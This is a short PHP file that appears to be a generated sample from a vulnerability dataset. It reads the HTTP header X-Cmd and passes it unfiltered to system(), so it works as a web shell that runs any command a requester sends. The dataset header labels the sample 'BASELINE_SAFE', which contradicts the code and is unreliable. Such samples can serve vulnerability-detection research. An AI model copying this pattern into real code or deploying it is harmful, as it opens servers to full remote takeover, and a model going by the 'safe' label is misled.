<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_CHANGEKEYCASE; SKELETON=S0; KEY=cmd; SINK=B1; VAR=v0227; HDR_NAME=X-Cmd */
function SINK_B1($command){
    system($command);
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$h2 = array_change_key_case($h, CASE_LOWER);
$inp = (string)($h2["x-cmd"] ?? "");
$inp = (string)$inp; // no value processing
$out = SINK_B1($inp);
echo (string)($out);
?>
